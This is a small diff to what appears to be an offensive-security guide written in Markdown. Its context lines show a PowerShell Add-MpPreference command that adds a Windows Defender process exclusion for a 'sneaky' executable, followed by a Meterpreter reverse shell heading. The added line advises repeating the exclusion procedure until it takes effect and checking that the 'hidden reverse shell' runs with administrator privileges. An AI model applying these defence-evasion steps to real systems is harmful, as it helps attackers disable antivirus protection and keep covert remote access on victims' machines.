@@ -102,6 +102,7 @@ Add-MpPreference -ExclusionProcess "$sneaky_exename"
 ```powershell
 Get-MpPreference
 ```
+ - If after entering the above commands you do not see any newly added rules in Windows Defender, repeat the procedure until they appear. If after some time there are still no changes, then check the launch of the hidden reverse shell with administrator privileges
 
 ## Meterpreter Reverse Shell
 
